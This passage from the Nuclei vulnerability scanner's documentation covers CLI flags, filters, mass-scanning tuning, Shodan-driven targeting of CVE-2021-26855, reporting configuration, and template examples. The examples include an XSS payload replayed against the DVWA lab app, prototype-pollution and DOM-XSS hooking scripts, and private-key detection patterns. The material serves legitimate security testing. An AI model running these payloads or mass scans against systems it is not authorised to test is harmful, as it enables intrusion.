strategy to use while scanning(auto/host-spray/template-spray) (default auto) -irt, -input-read-timeout duration timeout on input read (default 3m0s) -nh, -no-httpx disable httpx probing for non-url input -no-stdin disable stdin processing HEADLESS: -headless enable templates that require headless browser support (root user on Linux will disable sandbox) -page-timeout int seconds to wait for each page in headless mode (default 20) -sb, -show-browser show the browser on the screen when running templates with headless mode -ho, -headless-options string[] start headless chrome with additional options -sc, -system-chrome use local installed Chrome browser instead of nuclei installed -lha, -list-headless-action list available headless actions DEBUG: -debug show all requests and responses -dreq, -debug-req show all sent requests -dresp, -debug-resp show all received responses -p, -proxy string[] list of http/socks5 proxy to use (comma separated or file input) -pi, -proxy-internal proxy all internal requests -ldf, -list-dsl-function list all supported DSL function signatures -tlog, -trace-log string file to write sent requests trace log -elog, -error-log string file to write sent requests error log -version show nuclei version -hm, -hang-monitor enable nuclei hang monitoring -v, -verbose show verbose output -profile-mem string optional nuclei memory profile dump file -vv display templates loaded for scan -svd, -show-var-dump show variables dump for debugging -ep, -enable-pprof enable pprof debugging server -tv, -templates-version shows the version of the installed nuclei-templates -hc, -health-check run diagnostic check up UPDATE: -up, -update update nuclei engine to the latest released version -ut, -update-templates update nuclei-templates to latest released version -ud, -update-template-dir string custom directory to install / update nuclei-templates -duc, -disable-update-check disable automatic nuclei/templates update check STATISTICS: -stats display statistics about the running scan -sj, -stats-json display statistics in JSONL(ines) format -si, -stats-interval int number of seconds to wait between showing a statistics update (default 5) -m, -metrics expose nuclei metrics on a port -mp, -metrics-port int port to expose nuclei metrics on (default 9092)","title":"Nuclei Usage"},{"location":"nuclei/get-started/#running-nuclei","text":"Nuclei templates can be primarily executed in two ways, 1) Templates ( -t/templates ) As default, all the templates (except nuclei-ignore list) gets executed from default template installation path. nuclei -u https://example.com Custom template directory or multiple template directory can be executed as follows, nuclei -u https://example.com -t cves/ -t exposures/ Custom template Github repos are downloaded under github directory. Custom repo templates can be passed as follows nuclei -u https://example.com -t github/private-repo Similarly, Templates can be executed against list of URLs. nuclei -list http_urls.txt 2) Workflows ( -w/workflows ) nuclei -u https://example.com -w workflows/ Similarly, Workflows can be executed against list of URLs. nuclei -list http_urls.txt -w workflows/wordpress-workflow.yaml","title":"Running Nuclei"},{"location":"nuclei/get-started/#nuclei-filters","text":"Nuclei engine supports three basic filters to customize template execution. Tags ( -tags ) Filter based on tags field available in the template. Severity ( -severity ) Filter based on severity field available in the template. Author ( -author ) Filter based on author field available in the template. As default, Filters are applied on installed path of templates and can be customized with manual template path input. For example, below command will run all the templates installed at ~/nuclei-templates/ directory and has cve tags in it. nuclei -u https://example.com -tags cve And this example will run all the templates available under ~/nuclei-templates/exposures/ directory and has config tag in it. nuclei -u https://example.com -tags config -t exposures/ Multiple filters works together with AND condition, below example runs all template with cve tags AND has critical OR high severity AND geeknik as author of template. nuclei -u https://example.com -tags cve -severity critical,high -author geeknik Multiple filters can also be combined using the template condition flag ( -tc ) that allows complex expressions like the following ones: nuclei -tc \"contains(id,'xss') || contains(tags,'xss')\" nuclei -tc \"contains(tags,'cve') && contains(tags,'ssrf')\" nuclei -tc \"contains(name, 'Local File Inclusion')\" The supported fields are: id string name string description string tags slice of strings authors slice of strings severity string protocol string http_method slice of strings body string (containing all request bodies if any) matcher_type slice of string extractor_type slice of string description string Also, every key-value pair from the template metadata section is accessible. All fields can be combined with logical operators ( || and && ) and used with DSL helper functions. Similarly, all filters are supported in workflows as well. nuclei -w workflows/wordpress-workflow.yaml -severity critical,high -list http_urls.txt Workflows In Workflows, Nuclei filters are applied on templates or sub-templates running via workflows, not on the workflows itself.","title":"Nuclei Filters"},{"location":"nuclei/get-started/#rate-limits","text":"Nuclei have multiple rate limit controls for multiple factors, including a number of templates to execute in parallel, a number of hosts to be scanned in parallel for each template, and the global number of request / per second you wanted to make/limit using nuclei, here is an example of each flag with description. Flag Description rate-limit Control the total number of request to send per seconds bulk-size Control the number of hosts to process in parallel for each template c Control the number of templates to process in parallel Feel free to play with these flags to tune your nuclei scan speed and accuracy. Tip rate-limit flag takes precedence over the other two flags, the number of requests/seconds can't go beyond the value defined for rate-limit flag regardless the value of c and bulk-size flag.","title":"Rate Limits"},{"location":"nuclei/get-started/#traffic-tagging","text":"Many BugBounty platform/programs requires you to identify the HTTP traffic you make, this can be achieved by setting custom header using config file at $HOME/.config/nuclei/config.yaml or CLI flag -H / header Setting custom header using config file # Headers to include with each request. header : - 'X-BugBounty-Hacker: h1/geekboy' - 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei' Setting custom header using CLI flag nuclei -header 'User-Agent : Mozilla/5.0 (Windows NT 10.0; WOW64) / nuclei' -list urls.txt -tags cves","title":"Traffic Tagging"},{"location":"nuclei/get-started/#template-exclusion","text":"Nuclei supports a variety of methods for excluding / blocking templates from execution. By default, nuclei excludes the tags/templates listed below from execution to avoid unexpected fuzz based scans and some that are not supposed to run for mass scan, and these can be easily overwritten with nuclei configuration file / flags. Default Template ignore list. nuclei-ignore file is not supposed to be updated / edited / removed by user, to overwrite default ignore list, utilize nuclei configuration file. Nuclei engine supports two ways to manually exclude templates from scan, Exclude Templates ( -exclude-templates/exclude ) exclude-templates flag is used to exclude single or multiple templates and directory, multiple -exclude-templates flag can be used to provide multiple values. Exclude Tags ( -exclude-tags/etags ) exclude-tags flag is used to exclude templates based in defined tags, single or multiple can be used to exclude templates. Example of excluding single template nuclei -list urls.txt -t cves/ -exclude-templates cves/2020/CVE-2020-XXXX.yaml Example of multiple template exclusion nuclei -list urls.txt -exclude-templates exposed-panels/ -exclude-templates technologies/ Example of excluding templates with single tag nuclei -l urls.txt -t cves/ -etags xss Example of excluding templates with multiple tags nuclei -l urls.txt -t cves/ -etags sqli,rce To easily overwrite nuclei-ignore , Nuclei engine supports include-tags / include-templates flag. Example of running blocked templates nuclei -l urls.txt -include-tags iot,misc,fuzz","title":"Template Exclusion"},{"location":"nuclei/get-started/#headless-mode","text":"","title":"Headless Mode"},{"location":"nuclei/get-started/#-headless-options","text":"Additional chrome options can be specified using -headless-options , for example - nuclei -u https://tesla.com -headless -headless-options --no-sandbox,proxy-server=http://127.0.0.1:8080","title":"-headless-options"},{"location":"nuclei/get-started/#uncover-integration","text":"Nuclei supports integration with uncover to execute templates against hosts returned by uncover for the given query. Here are uncover options to use - nuclei -h uncover UNCOVER: -uc, -uncover enable uncover engine -uq, -uncover-query string[] uncover search query -ue, -uncover-engine string[] uncover search engine (shodan,shodan-idb,fofa,censys,quake,hunter,zoomeye,netlas,criminalip) (default shodan) -uf, -uncover-field string uncover fields to return (ip,port,host) (default \"ip:port\") -ul, -uncover-limit int uncover results to return (default 100) -ucd, -uncover-delay int delay between uncover query requests in seconds (0 to disable) (default 1) You have to set the API key of the engine you are using as an environment variable in your shell. export SHODAN_API_KEY=xxx export CENSYS_API_ID=xxx export CENSYS_API_SECRET=xxx export FOFA_EMAIL=xxx export FOFA_KEY=xxx export QUAKE_TOKEN=xxx export HUNTER_API_KEY=xxx export ZOOMEYE_API_KEY=xxx Required API keys can be obtained by signing up on the following platforms Shodan , Censys , Fofa , Quake , Hunter and ZoomEye . Example of template execution using a search query. export SHODAN_API_KEY=xxx nuclei -id 'CVE-2021-26855' -uq 'vuln:CVE-2021-26855' -ue shodan It can also read queries from templates metadata and execute template against hosts returned by uncover for that query. Example of template execution using template-defined search queries. Template snippet of CVE-2021-26855 metadata : shodan-query : 'vuln:CVE-2021-26855' nuclei -t cves/2021/CVE-2021-26855.yaml -uncover nuclei -tags cve -uncover We can update the nuclei configuration file to include these tags for all scans.","title":"Uncover Integration"},{"location":"nuclei/get-started/#mass-scanning-using-nuclei","text":"Nuclei fully utilises resources to optimise scanning speed. However, when scanning thousands , if not millions, of targets , scanning using default parameter values is bound to cause some performance issues ex: low RPS, Slow Scans, Process Killed, High RAM consumption, etc. this is due to limited resources and network I/O. Hence following parameters need to be tuned based on system configuration and targets. Flag Short Description scan-strategy -ss Scan Strategy to Use (auto/host-spray/template-spray) bulk-size -bs Max Number of targets to scan in parallel concurrency -c Max Number of templates to use in parallel while scanning stream - stream mode - start elaborating without sorting the input Note These are common parameters that need to be tuned . apart from these -rate-limit , -retries , -timeout , -max-host-error also need to be tuned based on targets that are being scanned","title":"Mass Scanning using Nuclei"},{"location":"nuclei/get-started/#which-scan-strategy-to-use","text":"scan-strategy option can have three possible values host-spray : All templates are iterated over each target. template-spray : Each template is iterated over all targets. auto (Default) : Placeholder of template-spray for now. User should select Scan Strategy based on number of targets and Each strategy has its own pros & cons. When targets < 1000 . template-spray should be used . this strategy is slightly faster than host-spray but uses more RAM and doesnot optimally reuse connections. When targets > 1000 . host-spray should be used . this strategy uses less RAM than template-spray and reuses HTTP connections along with some minor improvements and these are crucial when mass scanning.","title":"Which Scan Strategy to Use?"},{"location":"nuclei/get-started/#concurrency-bulk-size","text":"Whatever the scan-strategy is -concurrency and -bulk-size are crucial for tuning any type of scan. While tuning these parameters following points should be noted. If scan-strategy is template-spray -concurrency < bulk-size (Ex: -concurrency 10 -bulk-size 200 ) If scan-strategy is host-spray -concurrency > bulk-size (Ex: -concurrency 200 -bulk-size 10 ) Tip -concurrency x -bulk-size <= 2500 (depending on system config)","title":"Concurrency &amp; Bulk-Size"},{"location":"nuclei/get-started/#stream","text":"This option should only be enabled if targets > 10k . This skips any type of sorting or preprocessing on target list.","title":"Stream"},{"location":"nuclei/get-started/#nuclei-config","text":"Since release of v.2.3.2 nuclei uses goflags for clean CLI experience and long/short formatted flags. goflags comes with auto-generated config file support that coverts all available CLI flags into config file, basically you can define all CLI flags into config file to avoid repetitive CLI flags that loads as default for every scan of nuclei. Default path of nuclei config file is $HOME/.config/nuclei/config.yaml , uncomment and configure the flags you wish to run as default. Here is an example config file: # Headers to include with all HTTP request header : - 'X-BugBounty-Hacker: h1/geekboy' # Directory based template execution templates : - cves/ - vulnerabilities/ - misconfiguration/ # Tags based template execution tags : exposures,cve # Template Filters tags : exposures,cve author : geeknik,pikpikcu,dhiyaneshdk severity : critical,high,medium # Template Allowlist include-tags : dos,fuzz # Tag based inclusion (allows overwriting nuclei-ignore list) include-templates : # Template based inclusion (allows overwriting nuclei-ignore list) - vulnerabilities/xxx - misconfiguration/xxxx # Template Denylist exclude-tags : info # Tag based exclusion exclude-templates : # Template based exclusion - vulnerabilities/xxx - misconfiguration/xxxx # Rate Limit configuration rate-limit : 500 bulk-size : 50 concurrency : 50 Once configured, config file be used as default , additionally custom config file can be also provided using -config flag. Running nuclei with custom config file nuclei -config project.yaml -list urls.txt","title":"Nuclei Config"},{"location":"nuclei/get-started/#nuclei-reporting","text":"Nuclei comes with reporting module support with the release of v2.3.0 supporting GitHub, GitLab, and Jira integration, this allows nuclei engine to create automatic tickets on the supported platform based on found results. Platform GitHub GitLab Jira Markdown SARIF Elasticsearch Splunk HEC Support -rc, -report-config flag can be used to provide a config file to read configuration details of the platform to integrate. Here is an example config file for all supported platforms. For example, to create tickets on GitHub, create a config file with the following content and replace the appropriate values: # GitHub contains configuration options for GitHub issue tracker github : username : \"$user\" owner : \"$user\" token : \"$token\" project-name : \"testing-project\" issue-label : \"Nuclei\" To store results in Elasticsearch, create a config file with the following content and replace the appropriate values: # elasticsearch contains configuration options for elasticsearch exporter elasticsearch : # IP for elasticsearch instance ip : 127.0.0.1 # Port is the port of elasticsearch instance port : 9200 # IndexName is the name of the elasticsearch index index-name : nuclei To forward results to Splunk HEC, create a config file with the following content and replace the appropriate values: # splunkhec contains configuration options for splunkhec exporter splunkhec : # Hostname for splunkhec instance host : \"$hec_host\" # Port is the port of splunkhec instance port : 8088 # IndexName is the name of the splunkhec index index-name : nuclei # SSL enables ssl for splunkhec connection ssl : true # SSLVerification disables SSL verification for splunkhec ssl-verification : true # HEC Token for the splunkhec instance token : \"$hec_token\" To forward results to Jira, create a config file with the following content and replace the appropriate values: The Jira reporting options allows for custom fields, as well as using variables from the Nuclei templates in those custom fields. The supported variables currently are: $CVSSMetrics , $CVEID , $CWEID , $Host , $Severity , $CVSSScore , $Name In addition, Jira is strict when it comes to custom field entry. If the field is a dropdown, Jira accepts only the case sensitive specific string and the API call is slightly different. To support this, there are three types of customfields. name is the dropdown value id is the ID value of the dropdown freeform is if the customfield the entry of any value To avoid duplication, the JQL query run can be slightly modified by the config file. The CLOSED_STATUS can be changed in the Jira template file using the status-not variable. summary ~ TEMPLATE_NAME AND summary ~ HOSTNAME AND status != CLOSED_STATUS jira : # cloud is the boolean which tells if Jira instance is running in the cloud or on-prem version is used cloud : true # update-existing is the boolean which tells if the existing, opened issue should be updated or new one should be created update-existing : false # URL is the jira application url url : https://localhost/jira # account-id is the account-id of the Jira user or username in case of on-prem Jira account-id : test-account-id # email is the email of the user for Jira instance email : test@test.com # token is the token for Jira instance or password in case of on-prem Jira token : test-token #project-name is the name of the project. project-name : test-project-name #issue-type is the name of the created issue type (case sensitive) issue-type : Bug # SeverityAsLabel (optional) sends the severity as the label of the created issue # User custom fields for Jira Cloud instead severity-as-label : true # Whatever your final status is that you want to use as a closed ticket - Closed, Done, Remediated, etc # When checking for duplicates, the JQL query will filter out status's that match this. # If it finds a match _and_ the ticket does have this status, a new one will be created. status-not : Closed # Customfield supports name, id and freeform. name and id are to be used when the custom field is a dropdown. # freeform can be used if the custom field is just a text entry # Variables can be used to pull various pieces of data from the finding itself. # Supported variables: $CVSSMetrics, $CVEID, $CWEID, $Host, $Severity, $CVSSScore, $Name custom_fields : customfield_00001 : name : \"Nuclei\" customfield_00002 : freeform : $CVSSMetrics customfield_00003 : freeform : $CVSSScore Running nuclei with reporting module: nuclei -l urls.txt -t cves/ -rc issue-tracker.yaml Similarly, other platforms can be configured. Reporting module also supports basic filtering and duplicate checks to avoid duplicate ticket creation. allow-list : severity : high,critical This will ensure to only creating tickets for issues identified with high and critical severity; similarly, deny-list can be used to exclude issues with a specific severity. If you are running periodic scans on the same assets, you might want to consider -rdb, -report-db flag that creates a local copy of the valid findings in the given directory utilized by reporting module to compare and create tickets for unique issues only . nuclei -l urls.txt -t cves/ -rc issue-tracker.yaml -rdb prod Markdown Export Nuclei supports markdown export of valid findings with -me, -markdown-export flag, this flag takes directory as input to store markdown formatted reports. Including request/response in the markdown report is optional, and included when -irr, -include-rr flag is used along with -me . nuclei -l urls.txt -t cves/ -irr -markdown-export reports Optionally, the markdown exports can be sorted by template, host, or severity by setting the enviroment variable: MARKDOWN_EXPORT_SORT_MODE to template , host , or severity . Example: export MARKDOWN_EXPORT_SORT_MODE=severity SARIF Export Nuclei supports SARIF export of valid findings with -se, -sarif-export flag. This flag takes a file as input to store SARIF formatted report. nuclei -l urls.txt -t cves/ -sarif-export report.sarif It is also possible to visualize Nuclei results using sarif file. By Uploading SARIF File to SARIF Viewer By Uploading SARIF File to Github Actions more info here . Note These are not official viewers of Nuclei and Nuclei has no liability towards any of these options to visualize Nuclei results. These are just some publicly available options to visualize SARIF File.","title":"Nuclei Reporting"},{"location":"nuclei/get-started/#scan-metrics","text":"Nuclei expose running scan metrics on a local port 9092 when -metrics flag is used and can be accessed at localhost:9092/metrics , default port to expose scan information is configurable using -metrics-port flag. Here is an example to query metrics while running nuclei as following nuclei -t cves/ -l urls.txt -metrics curl -s localhost:9092/metrics | jq . { \"duration\" : \"0:00:03\" , \"errors\" : \"2\" , \"hosts\" : \"1\" , \"matched\" : \"0\" , \"percent\" : \"99\" , \"requests\" : \"350\" , \"rps\" : \"132\" , \"startedAt\" : \"2021-03-27T18:02:18.886745+05:30\" , \"templates\" : \"256\" , \"total\" : \"352\" }","title":"Scan Metrics"},{"location":"nuclei/get-started/#passive-scan","text":"Nuclei engine supports passive mode scanning for HTTP based template utilizing file support, with this support we can run HTTP based templates against locally stored HTTP response data collected from any other tool. nuclei -passive -target http_data Passive mode support is limited for templates having {{BasedURL}} or {{BasedURL/}} as base path.","title":"Passive Scan"},{"location":"nuclei/get-started/#code-contribution","text":"Nuclei templates are the base of the nuclei project. We appreciate it if you can write and submit new templates to keep this project alive, and one of the reasons to keep us motivated to keep working on this project.","title":"Code Contribution"},{"location":"nuclei/get-started/#license","text":"Nuclei is distributed under MIT License .","title":"License"},{"location":"template-examples/dns/","text":"Basic template \u00b6 Basic DNS Request to detect if a CNAME record exists for an input. id : basic-dns-example info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contain a CNAME record - \"IN\\tCNAME\" Multiple matcher \u00b6 An example showcasing multiple matchers of nuclei, allowing detection of Subdomains with CNAME records that point to either zendesk.com or github.io . id : multiple-matcher info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 5 matchers-condition : or matchers : - type : word name : zendesk words : - \"zendesk.com\" - type : word name : github words : - \"github.io\"","title":"DNS"},{"location":"template-examples/dns/#basic-template","text":"Basic DNS Request to detect if a CNAME record exists for an input. id : basic-dns-example info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contain a CNAME record - \"IN\\tCNAME\"","title":"Basic template"},{"location":"template-examples/dns/#multiple-matcher","text":"An example showcasing multiple matchers of nuclei, allowing detection of Subdomains with CNAME records that point to either zendesk.com or github.io . id : multiple-matcher info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 5 matchers-condition : or matchers : - type : word name : zendesk words : - \"zendesk.com\" - type : word name : github words : - \"github.io\"","title":"Multiple matcher"},{"location":"template-examples/file/","text":"Basic File Template \u00b6 This template checks for a pattern in provided files. id : ssh-public-key info : name : SSH Public Key Detect author : pd-team severity : low file : - extensions : - pub max-size : 1024 # read very small chunks matchers : - type : word words : - \"ssh-rsa\" Extension Denylist with No-Recursive \u00b6 The below template is same as last one, but it makes use of an extension denylist along with the no-recursive option. id : ssh-private-key info : name : SSH Private Key Detect author : pd-team severity : high file : - extensions : - all denylist : - pub no-recursive : true max-size : 1024 # read very small chunks matchers : - type : word words : - \"BEGIN OPENSSH PRIVATE KEY\" - \"BEGIN PRIVATE KEY\" - \"BEGIN RSA PRIVATE KEY\" - \"BEGIN DSA PRIVATE KEY\" - \"BEGIN EC PRIVATE KEY\" - \"BEGIN PGP PRIVATE KEY BLOCK\" - \"ssh-rsa\"","title":"File"},{"location":"template-examples/file/#basic-file-template","text":"This template checks for a pattern in provided files. id : ssh-public-key info : name : SSH Public Key Detect author : pd-team severity : low file : - extensions : - pub max-size : 1024 # read very small chunks matchers : - type : word words : - \"ssh-rsa\"","title":"Basic File Template"},{"location":"template-examples/file/#extension-denylist-with-no-recursive","text":"The below template is same as last one, but it makes use of an extension denylist along with the no-recursive option. id : ssh-private-key info : name : SSH Private Key Detect author : pd-team severity : high file : - extensions : - all denylist : - pub no-recursive : true max-size : 1024 # read very small chunks matchers : - type : word words : - \"BEGIN OPENSSH PRIVATE KEY\" - \"BEGIN PRIVATE KEY\" - \"BEGIN RSA PRIVATE KEY\" - \"BEGIN DSA PRIVATE KEY\" - \"BEGIN EC PRIVATE KEY\" - \"BEGIN PGP PRIVATE KEY BLOCK\" - \"ssh-rsa\"","title":"Extension Denylist with No-Recursive"},{"location":"template-examples/headless/","text":"Basic Headless Navigation Example \u00b6 This template visits a URL in the headless browser and waits for it to load. id : basic-headless-request info : name : Basic Headless Request author : pdteam severity : info headless : - steps : - action : navigate args : url : \"{{BaseURL}}\" - action : waitload Headless prototype pollution detection \u00b6 The below template detects prototype pollution on pages with Nuclei headless capabilities. The code for detection is taken from https://github.com/msrkp/PPScan . We make use of script injection capabilities of nuclei to provide reliable detection for prototype pollution. id : prototype-pollution-check info : name : Prototype Pollution Check author : pd-team severity : medium reference : https://github.com/msrkp/PPScan headless : - steps : - action : setheader args : part : response key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" - action : setheader args : part : response key : X-Frame-Options value : foo - action : setheader args : part : response key : If-None-Match value : foo # Set the hook to override window.data for xss detection - action : script args : hook : true code : | // Hooking code adapted from https://github.com/msrkp/PPScan/blob/main/scripts/content_script.js (function() {window.alerts = []; function logger(found) { window.alerts.push(found); } function check() { loc = location.href; if (loc.indexOf(\"e32a5ec9c99\") >= 0 && loc.search(\"a0def12bce\") == -1) { setTimeout(function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\") { logger(location.href); } var url = new URL(location.origin + location.pathname); url.hash = \"__proto__[a0def12bce]=ddcb362f1d60&__proto__.a0def12bce=ddcb362f1d60&dummy\"; location = url.href; }, 5 * 1000); } else if (loc.search(\"a0def12bce\") != -1) { setTimeout(function() { if (Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); } window.close(); }, 5 * 1000); } else { var url = new URL(loc); url.searchParams.append(\"__proto__[e32a5ec9c99]\", \"ddcb362f1d60\"); url.searchParams.append(\"__proto__.e32a5ec9c99\", \"ddcb362f1d60\"); location = url.href; } } window.onload = function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" || Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); } else { check(); } }; var timerID = setInterval(function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" || Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); clearInterval(timerID); } }, 5 * 1000)})(); - args : url : \"{{BaseURL}}\" action : navigate - action : waitload - action : script name : alerts args : code : \"window.alerts\" matchers : - type : word part : alerts words : - \"__proto__\" extractors : - type : kval part : alerts kval : - alerts DVWA XSS Reproduction With Headless Mode \u00b6 This template logs into DVWA (Damn Vulnerable Web App) and tries to automatically reproduce a Reflected XSS, returning a match if it found that the payload was executed successfully. id : dvwa-xss-verification info : name : DVWA Reflected XSS Verification author : pd-team severity : info headless : - steps : - args : url : \"{{BaseURL}}\" action : navigate - action : waitload # Set the hook to override window.data for xss detection - action : script args : hook : true code : \"(function() { window.alert = function() { window.data = 'found' } })()\" - args : by : x value : admin xpath : /html/body/div/div[2]/form/fieldset/input action : text - args : by : x value : password xpath : /html/body/div/div[2]/form/fieldset/input[2] action : text - args : by : x xpath : /html/body/div/div[2]/form/fieldset/p/input action : click - action : waitload - args : by : x xpath : /html/body/div/div[2]/div/ul[2]/li[11]/a action : click - action : waitload - args : by : x value : '\"><svg/onload=alert(1)>' xpath : /html/body/div/div[3]/div/div/form/p/input action : text - args : keys : \"\\r\" # Press the enter key on the keyboard action : keyboard - action : waitload - action : script name : alert args : code : \"window.data\" matchers : - part : alert type : word words : - \"found\" DOM XSS Detection \u00b6 This template performs detection of DOM-XSS for window.name source by hooking common sinks such as eval , innerHTML and document.write . id : window-name-domxss info : name : window.name DOM XSS author : pd-team severity : medium headless : - steps : - action : setheader args : part : response key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" - action : script args : hook : true code : | (function() {window.alerts = []; function logger(found) { window.alerts.push(found); } function getStackTrace () { var stack; try { throw new Error(''); } catch (error) { stack = error.stack || ''; } stack = stack.split('\\n').map(function (line) { return line.trim(); }); return stack.splice(stack[0] == 'Error' ? 2 : 1); } window.name = \"{{randstr_1}}'\\\"<>\"; var oldEval = eval; var oldDocumentWrite = document.write; var setter = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set; Object.defineProperty(Element.prototype, 'innerHTML', { set: function innerHTML_Setter(val) { if (val.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'innerHTML', source: 'window.name', code: val, stack: getStackTrace()}); } return setter.call(this, val) } }); eval = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'eval' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; document.write = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'document.write' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; })(); - args : url : \"{{BaseURL}}\" action : navigate - action : waitload - action : script name : alerts args : code : \"window.alerts\" matchers : - type : word part : alerts words : - \"sink:\" extractors : - type : kval part : alerts kval : - alerts","title":"Headless"},{"location":"template-examples/headless/#basic-headless-navigation-example","text":"This template visits a URL in the headless browser and waits for it to load. id : basic-headless-request info : name : Basic Headless Request author : pdteam severity : info headless : - steps : - action : navigate args : url : \"{{BaseURL}}\" - action : waitload","title":"Basic Headless Navigation Example"},{"location":"template-examples/headless/#headless-prototype-pollution-detection","text":"The below template detects prototype pollution on pages with Nuclei headless capabilities. The code for detection is taken from https://github.com/msrkp/PPScan . We make use of script injection capabilities of nuclei to provide reliable detection for prototype pollution. id : prototype-pollution-check info : name : Prototype Pollution Check author : pd-team severity : medium reference : https://github.com/msrkp/PPScan headless : - steps : - action : setheader args : part : response key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" - action : setheader args : part : response key : X-Frame-Options value : foo - action : setheader args : part : response key : If-None-Match value : foo # Set the hook to override window.data for xss detection - action : script args : hook : true code : | // Hooking code adapted from https://github.com/msrkp/PPScan/blob/main/scripts/content_script.js (function() {window.alerts = []; function logger(found) { window.alerts.push(found); } function check() { loc = location.href; if (loc.indexOf(\"e32a5ec9c99\") >= 0 && loc.search(\"a0def12bce\") == -1) { setTimeout(function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\") { logger(location.href); } var url = new URL(location.origin + location.pathname); url.hash = \"__proto__[a0def12bce]=ddcb362f1d60&__proto__.a0def12bce=ddcb362f1d60&dummy\"; location = url.href; }, 5 * 1000); } else if (loc.search(\"a0def12bce\") != -1) { setTimeout(function() { if (Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); } window.close(); }, 5 * 1000); } else { var url = new URL(loc); url.searchParams.append(\"__proto__[e32a5ec9c99]\", \"ddcb362f1d60\"); url.searchParams.append(\"__proto__.e32a5ec9c99\", \"ddcb362f1d60\"); location = url.href; } } window.onload = function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" || Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); } else { check(); } }; var timerID = setInterval(function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" || Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); clearInterval(timerID); } }, 5 * 1000)})(); - args : url : \"{{BaseURL}}\" action : navigate - action : waitload - action : script name : alerts args : code : \"window.alerts\" matchers : - type : word part : alerts words : - \"__proto__\" extractors : - type : kval part : alerts kval : - alerts","title":"Headless prototype pollution detection"},{"location":"template-examples/headless/#dvwa-xss-reproduction-with-headless-mode","text":"This template logs into DVWA (Damn Vulnerable Web App) and tries to automatically reproduce a Reflected XSS, returning a match if it found that the payload was executed successfully. id : dvwa-xss-verification info : name : DVWA Reflected XSS Verification author : pd-team severity : info headless : - steps : - args : url : \"{{BaseURL}}\" action : navigate - action : waitload # Set the hook to override window.data for xss detection - action : script args : hook : true code : \"(function() { window.alert = function() { window.data = 'found' } })()\" - args : by : x value : admin xpath : /html/body/div/div[2]/form/fieldset/input action : text - args : by : x value : password xpath : /html/body/div/div[2]/form/fieldset/input[2] action : text - args : by : x xpath : /html/body/div/div[2]/form/fieldset/p/input action : click - action : waitload - args : by : x xpath : /html/body/div/div[2]/div/ul[2]/li[11]/a action : click - action : waitload - args : by : x value : '\"><svg/onload=alert(1)>' xpath : /html/body/div/div[3]/div/div/form/p/input action : text - args : keys : \"\\r\" # Press the enter key on the keyboard action : keyboard - action : waitload - action : script name : alert args : code : \"window.data\" matchers : - part : alert type : word words : - \"found\"","title":"DVWA XSS Reproduction With Headless Mode"},{"location":"template-examples/headless/#dom-xss-detection","text":"This template performs detection of DOM-XSS for window.name source by hooking common sinks such as eval , innerHTML and document.write . id : window-name-domxss info : name : window.name DOM XSS author : pd-team severity : medium headless : - steps : - action : setheader args : part : response key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" - action : script args : hook : true code : | (function() {window.alerts = []; function logger(found) { window.alerts.push(found); } function getStackTrace () { var stack; try { throw new Error(''); } catch (error) { stack = error.stack || ''; } stack = stack.split('\\n').map(function (line) { return line.trim(); }); return stack.splice(stack[0] == 'Error' ? 2 : 1); } window.name = \"{{randstr_1}}'\\\"<>\"; var oldEval = eval; var oldDocumentWrite = document.write; var setter = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set; Object.defineProperty(Element.prototype, 'innerHTML', { set: function innerHTML_Setter(val) { if (val.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'innerHTML', source: 'window.name', code: val, stack: getStackTrace()}); } return setter.call(this, val) } }); eval = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'eval' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; document.write = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'document.write' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; })(); - args : url : \"{{BaseURL}}\" action : navigate - action : waitload - action : script name : alerts args : code : \"window.alerts\" matchers : - type : word part : alerts words : - \"sink:\" extractors : - type : kval part : alerts kval : - alerts","title":"DOM XSS Detection"},{"location":"template-examples/helper-functions/","text":"Helper Functions Examples \u00b6 Nuclei has a number of helper functions that may be used to conduct various run-time operations on the request block. Here's an example template that shows how to use all the available helper functions. id : helper-functions-examples info : name : RAW Template with Helper Functions author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} 01: {{base64(\"Hello\")}} 02: {{base64(1234)}} 03: {{base64_decode(\"SGVsbG8=\")}} 04: {{base64_py(\"Hello\")}} 05: 